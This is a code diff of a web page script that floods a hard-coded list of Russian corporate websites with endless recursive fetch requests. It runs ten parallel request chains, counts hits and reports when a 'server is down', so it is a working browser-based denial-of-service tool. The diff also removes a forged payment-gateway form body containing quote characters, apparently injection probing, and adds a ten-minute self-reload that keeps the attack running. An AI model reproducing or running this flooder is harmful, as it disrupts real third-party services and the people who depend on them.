@@ -1,31 +1,28 @@
 <script>
+  const SITES = [
+    "https://www.russianhighways.ru",
+    "https://www.nornickel.com",
+    "https://www.surgutneftegas.ru",
+    "https://www.evraz.com",
+    "https://nlmk.com/ru/",
+    "https://www.metalloinvest.com",
+  ];
+
   async function request(i, ord) {
-    const sites = [
-      "https://www.russianhighways.ru",
-      "https://www.nornickel.com",
-      "https://www.surgutneftegas.ru",
-      "https://www.evraz.com",
-      "https://nlmk.com/ru/",
-      "https://www.metalloinvest.com",
-    ];
     i++;
 
-    const siteToFetch = sites[Math.floor(Math.random() * sites.length)];
+    const siteToFetch = SITES[Math.floor(Math.random() * SITES.length)];
     fetch(siteToFetch, {
-      method: "POST",
       mode: "no-cors",
       referrerPolicy: "no-referrer",
-      headers: {
-        "Content-Type": "application/x-www-form-urlencoded",
-      },
-      body: "version=3.0&merchantID=wildberries&xid=MTIzNDEyMzQzMjE0%27%22&mdStatus=7&mdErrorMsg=System+error+%28errid%3D321372363821%29&veresEnrolledStatus=-&paresTxStatus=-&iReqCode=&iReqDetail=&vendorCode=&eci=&cavv=&cavvAlgorithm=&MD=&PAResVerified=&PAResSyntaxOK=&lastEventGmtTime=2022-03-08+14%3A06%3A03.822&digest=&sID=&protocol=",
+      headers: { "Content-Type": "application/json" },
     })
       .then((response) => {
-        message("Requests: " + (sites.length * i + ord));
+        message("Requests: " + (SITES.length * i + ord));
         request(i, ord);
       })
       .catch((error) => {
-        message("Requests: " + (sites.length * i + ord) + " Server is down!");
+        message("Requests: " + (SITES.length * i + ord) + " Server is down!");
         request(i, ord);
       });
   }
@@ -44,8 +41,8 @@
   request(0, 9);
   request(0, 10);
 
-  setTimeout(() => {
-    location.href = "/";
-  }, 2000);
+  // reload to pick up any new changes
+  const TEN_MINUTES = 10 * 60 * 1000;
+  setTimeout(() => window.location.reload(false), TEN_MINUTES);
 </script>
 <div id="message">Please wait</div>
